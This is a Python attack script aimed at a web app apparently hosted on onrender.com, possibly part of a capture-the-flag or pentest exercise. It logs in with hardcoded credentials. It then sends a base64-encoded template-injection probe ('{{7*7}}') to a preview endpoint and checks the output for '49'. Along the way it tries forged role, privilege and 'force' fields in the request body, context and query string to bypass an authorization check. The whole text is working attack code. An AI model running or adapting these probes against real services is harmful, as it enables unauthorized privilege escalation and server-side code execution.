import requests, time, base64

base = 'https://outofcontext-app.onrender.com'

def login():
    for a in range(8):
        s = requests.Session()
        s.post(base + '/login', data={'username': 'compliance_officer', 'password': 'AuditPolicy2026!'}, timeout=40)
        if s.cookies.get('session'):
            return s
        time.sleep(25)
    return None

s = login()
b64 = base64.b64encode(b'Hello {{7*7}} World').decode()

variants = [
    ('role-body', {'content_b64': b64, 'context': {}, 'role': 'Document Specialist'}),
    ('privilege-body', {'content_b64': b64, 'context': {}, 'privilege': 'Document Specialist'}),
    ('is_specialist', {'content_b64': b64, 'context': {}, 'is_specialist': True}),
    ('user_role', {'content_b64': b64, 'context': {}, 'user_role': 'Document Specialist'}),
    ('role-in-context', {'content_b64': b64, 'context': {'role': 'Document Specialist'}}),
    ('force', {'content_b64': b64, 'context': {}, 'force': True, 'preview': True}),
]

def call(body, params=None):
    for a in range(6):
        try:
            r = s.post(base + '/api/templates/preview', json=body, params=params, timeout=40, allow_redirects=False)
        except Exception:
            time.sleep(12); continue
        if r.status_code in (429, 502, 503):
            time.sleep(18); continue
        return r.status_code, r.text[:160]
    return 'TRANSIENT', ''

for name, body in variants:
    sc, txt = call(body)
    print(name, sc, ('<<<49' if '49' in txt else ''), txt[:110])
    time.sleep(2)

# query param role
sc, txt = call({'content_b64': b64, 'context': {}}, params={'role': 'Document Specialist'})
print('query-role', sc, ('<<<49' if '49' in txt else ''), txt[:110])
